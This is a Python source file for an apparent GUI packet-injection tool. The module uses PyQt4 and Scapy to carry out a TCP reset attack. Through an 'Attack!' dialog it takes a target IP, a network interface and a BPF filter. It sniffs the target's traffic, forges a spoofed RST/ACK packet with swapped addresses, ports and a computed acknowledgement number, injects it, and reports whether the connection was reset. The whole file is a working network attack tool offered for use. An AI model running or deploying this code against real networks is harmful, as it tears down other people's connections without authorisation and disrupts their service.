from PyQt4.QtCore import QThread
from PyQt4.QtCore import pyqtSlot
from PyQt4.QtGui import QWidget, QGridLayout, QLabel, QPushButton, QLineEdit, QComboBox
from scapy.all import *
from injector_lib import getFlags
import netifaces

class Module_RST(QThread):
    def __init__(self):
        QThread.__init__(self)
        self.textBox = None
        self.iface = None
        self.bpf_filter = None
        self.target_ip = None

    def __del__(self):
        self.wait()

    def setupUI(self):
        w_rst = QWidget()
        w_rst.setWindowTitle('TCP Reset configuration')
        w_rst.resize(300, 180)
        w_rst_layout = QGridLayout()
        w_rst.setLayout(w_rst_layout)

        rst_lbl_target = QLabel("Target IP: ")
        rst_txt_target = QLineEdit()
        w_rst_layout.addWidget(rst_lbl_target, 0, 0)
        w_rst_layout.addWidget(rst_txt_target, 0, 1)

        rst_lbl_iface = QLabel("Net. Interface: ")
        ifaces = netifaces.interfaces()
        cb_iface = QComboBox()
        cb_iface.addItems(ifaces)
        w_rst_layout.addWidget(rst_lbl_iface, 1, 0)
        w_rst_layout.addWidget(cb_iface, 1, 1)

        rst_lbl_filter = QLabel("BPF Filter: ")
        rst_txt_filter = QLineEdit()
        w_rst_layout.addWidget(rst_lbl_filter, 2, 0)
        w_rst_layout.addWidget(rst_txt_filter, 2, 1)

        rst_btn_att = QPushButton("Attack!")
        w_rst_layout.addWidget(rst_btn_att, 3, 0)

        @pyqtSlot()
        def on_click():
            self.log_textBox.appendText("TCP reset attack starting...\n")
            self.setTarget(cb_iface.currentText(), rst_txt_filter.text(), rst_txt_target.text())
            w_rst.close()
            self.start()

        rst_btn_att.clicked.connect(on_click)

        return w_rst


    def setTextBox(self, log_textBox, original_textBox, new_textBox):
        self.log_textBox = log_textBox
        self.original_textBox = original_textBox
        self.new_textBox = new_textBox

    def setTarget(self, iface, bpf_filter, target_ip):
        self.iface = iface
        self.bpf_filter = bpf_filter
        self.target_ip = target_ip

    def inj(self, pacote, pkt):
        self.original_textBox.setText("Trigged packet:\n src IP: "+ pkt[IP].src + "\n dst IP: " + pkt[IP].dst + "\n ACK: " + str(pkt[TCP].ack) + "\n SEQ: " + str(pkt[TCP].seq) + "\n flags: " + str(getFlags(pkt[TCP].flags)))

        ether_dst = pkt[Ether].dst
        ether_src = pkt[Ether].src
        ip_dst = pkt[IP].dst
        ip_src = pkt[IP].src
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        ack = pkt[TCP].seq + 1

        # Ether
        pacote[Ether].dst = ether_src
        pacote[Ether].src = ether_dst

        # IP
        pacote[IP].src = ip_dst
        pacote[IP].dst = ip_src

        pacote[TCP].dport = sport
        pacote[TCP].sport = dport
        pacote[TCP].ack = ack


        sendp(pacote, iface=self.iface)
        self.new_textBox.setText("Trigged packet:\n src IP: "+ pacote[IP].src + "\n dst IP: " + pacote[IP].dst + "\n ACK: " + str(pacote[TCP].ack) + "\n SEQ: " + str(pacote[TCP].seq) + "\n flags: " + str(getFlags(pacote[TCP].flags)))
        sniffing  = sniff(iface = self.iface, filter = self.bpf_filter, count = 2)
        flags = str(getFlags(sniffing[1][TCP].flags))
        if 'RST' in flags:
            self.log_textBox.appendText("TCP reset attack successfull!\n")
        else:
            self.log_textBox.appendText("TCP reset attack failed.\n")

    def attack(self):
        pacote = Ether()/IP()/TCP()

        # IP
        pacote[IP].ihl = 5
        pacote[IP].id = 1298
        pacote[IP].flags="DF"
        pacote[IP].len = 40


        # TCP
        pacote[TCP].seq = 0
        pacote[TCP].dataofs=5
        pacote[TCP].flags="RA"
        pacote[TCP].window=0
        pacote[TCP].options={}

        if self.bpf_filter != "":
            self.bpf_filter += " and ip dst " + self.target_ip
        else:
            self.bpf_filter = "ip dst " + self.target_ip

        sniffing = sniff(iface = self.iface, filter = self.bpf_filter, count = 1)
        self.inj(pacote, sniffing[0])

    def run(self):
        self.attack()
